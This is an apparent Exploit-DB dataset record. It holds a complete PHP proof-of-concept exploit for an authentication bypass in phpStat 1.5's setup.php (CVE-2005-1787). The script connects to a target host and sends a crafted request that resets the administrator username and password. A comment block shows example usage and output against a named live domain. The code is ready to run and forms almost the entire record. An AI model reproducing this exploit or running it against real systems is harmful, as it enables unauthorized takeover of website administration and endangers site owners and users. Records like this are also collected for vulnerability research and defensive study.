{
  "id": "1018",
  "title": "phpStat 1.5 - &#039;setup.php&#039; Authentication Bypass (PHP) (2)",
  "cve": "CVE-2005-1787",
  "vuln_type": "auth_bypass",
  "code": "<?\r\n\r\n/*\r\n\r\n**************************************************************\r\nPHP Stat Administrative User Authentication Bypass POC Exploit\r\n     Code by Nikyt0x - Soulblack Security Research\r\n**************************************************************\r\n\r\nAdvisory: \r\n http://www.soulblack.com.ar/repo/papers/phpstat_advisory.txt\r\n\r\nSaludos:                                        \r\n   Soulblack Staff, Status-x, NeosecurityTeam,\r\n   KingMetal, SWP, Trespasser...\r\n\r\nnikyt0x@gmail.com\r\nhttp://www.nikyt0x.tk\r\n\r\n**************************************************************\r\n**This Exploit Change Admin Username and Password\r\n**Username: admin\r\n**Password: admin\r\n**************************************************************\r\n\r\n\r\nphp sbphpstatpoc.php www.spazfarm.com /spazstats/setup.php\r\n\r\n          ==============================================================\r\n          PHP Stat Administrative User Authentication Bypass POC Exploit\r\n          ==============================================================\r\n                     by Nikyt0x - Soulblack Security Research\r\n\r\n     [+] Testing: www.spazfarm.com\r\n     [+] Socket\r\n     [+] Sending Exploit\r\n     [+] OK\r\n\r\n     Open www.spazfarm.com/spazstats/setup.php\r\n\r\n     Username: admin\r\n     Password: 123456\r\n\r\n**************************************************************\r\n*/\r\n\r\n// username and password\r\n\r\n$username = \"admin\";\r\n$password = \"123456\";\r\n\r\nfunction sh0w()\r\n{\r\necho \"\\n          ==============================================================\\n\";\r\necho \"          PHP Stat Administrative User Authentication Bypass POC Exploit\\n\";\r\necho \"          ==============================================================\\n\";\r\necho \"                     by Nikyt0x - Soulblack Security Research\\n\\n\";\r\n}\r\n\r\nif ($argc != 3)\r\n{\r\nsh0w();\r\necho \"\\n\\n          Usage:\\n                   sbphpstatpoc.php www.site.com /dir/to/setup.php\\n\";\r\nexit();\r\n}\r\n\r\n\r\nif(!ereg('setup.php',$argv[2])) {\r\n   echo \"URL to setup.php Incorrect.\\n\";\r\n   exit(0);\r\n}\r\n\r\nsh0w();\r\n\r\necho \"     [+] Testing: $argv[1]\\n\";\r\n\r\n$s0ck3t = fsockopen($argv[1], 80);\r\n\r\nif (!$s0ck3t) {\r\n   echo \"     [-] Socket\\n\";\r\n   exit(0);\r\n} else {\r\n\r\n    $petici0n  = \"GET $argv[2]?check=yes&username=$username&password=$password HTTP/1.1\\r\\n\";\r\n    $petici0n .= \"Host: $argv[1]\\r\\n\";\r\n    $petici0n .= \"Connection: Close\\r\\n\\r\\n\";\r\n   \r\n   echo \"     [+] Socket\\n\";\r\n\r\nif(!fwrite($s0ck3t, $petici0n))\r\n   {\r\n   echo \"     [-] Sending Exploit\\n\";\r\n   exit(0);\r\n   }\r\necho \"     [+] Sending Exploit\\n\";\r\n\r\n while (!feof($s0ck3t)) {\r\n       $g3tdata = fgets($s0ck3t, 1024);\r\n\t   if (eregi('Setup has been updated',$g3tdata))\r\n\t   {\r\n\t   echo \"     [+] OK\\n\\n\";\r\n           echo \"     Open $argv[1]$argv[2]\\n\\n     Username: $username\\n     Password: $password\\n\";\r\n           exit();\r\n           }\r\n\r\n}\r\nfclose($s0ck3t);\r\n}\r\n\r\n?>\r\n\r\n# milw0rm.com [2005-05-30]",
  "url": "https://www.exploit-db.com/exploits/1018"
}